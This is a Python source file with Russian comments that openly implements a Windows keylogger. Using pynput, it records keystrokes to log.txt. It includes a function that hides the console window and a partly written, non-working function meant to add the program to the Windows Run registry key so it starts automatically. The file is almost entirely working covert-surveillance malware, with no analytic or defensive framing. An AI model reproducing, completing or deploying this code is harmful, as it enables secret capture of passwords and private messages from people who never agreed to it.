#Импортируем нужные нам библиотеки
from pynput import keyboard
import win32event, win32api
import os
import sys

# Добавляем нашу программу в автозагрузку
def addStartup():
    fp=os.path.dirname(os.path.realpath(r'C:\Users\111\keylogger\win_test.py'))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)


# Скрываем консоль
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True


#Собственно , сам кейлоггер 
def on_press(key):
    try:
    	logfile = open('log.txt', 'a')              # Создаём файл , вкоторый будут записываться нажатия
    	logfile.write('{0}'.format(key.char))
    	logfile.close()
        #print('alphanumeric key {0} pressed'.format(
        #    key.char))
    except AttributeError:
        logfile = open('log.txt', 'a')              # except для перехвата возможных ошибок , связаных с нажатием именно этих клавиш
        if(format(key) == 'Key.space'):
            logfile.write(' ')
        elif(format(key) == 'Key.enter'):
            logfile.write('\n') 
        elif(format(key) == 'Key.backspace'):
            pass
        elif(format(key) == 'Key.tab'):
            logfile.write('	')
        elif(format(key) == 'Key.caps_lock'):
            pass
        elif(format(key) == 'Key.shift'):
            pass
        elif(format(key) == 'Key.ctrl'):
            pass
        elif(format(key) == 'Key.alt'):
            pass
        elif(format(key) == 'Key.menu'):
            pass
        elif(format(key) == 'Key.home'):
            pass
        elif(format(key) == 'Key.insert'):
            pass
        elif(format(key) == 'Key.delete'):
            pass
        elif(format(key) == 'Key.page_down'):
            pass
        elif(format(key) == 'Key.page_up'):
            pass
        elif(format(key) == 'Key.end'):
            pass
        elif(format(key) == 'Key.esc'):
            pass
        elif(format(key) == 'Key.f1'):
            pass
        elif(format(key) == 'Key.f2'):
            pass
        elif(format(key) == 'Key.f3'):
            pass
        elif(format(key) == 'Key.f4'):
            pass
        elif(format(key) == 'Key.f5'):
            pass
        elif(format(key) == 'Key.f6'):
            pass
        elif(format(key) == 'Key.f7'):
            pass
        elif(format(key) == 'Key.f8'):
            pass
        elif(format(key) == 'Key.f9'):
            pass
        elif(format(key) == 'Key.f10'):
            pass
        elif(format(key) == 'Key.f11'):
            pass
        elif(format(key) == 'Key.f12'):
            pass
        else:
        	logfile.write(' {0} '.format(key))
        logfile.close()




# Функция из listener , он отвечает за роспознавание при  нажатии на клавиши
def board():
	with keyboard.Listener(
			on_press=on_press) as listener:
		listener.join()


#разделение кода, который будет выполнятся при вызове кода как модуля — и при запуске самого модуля, как отдельного файла.
if __name__ == '__main__':
	board()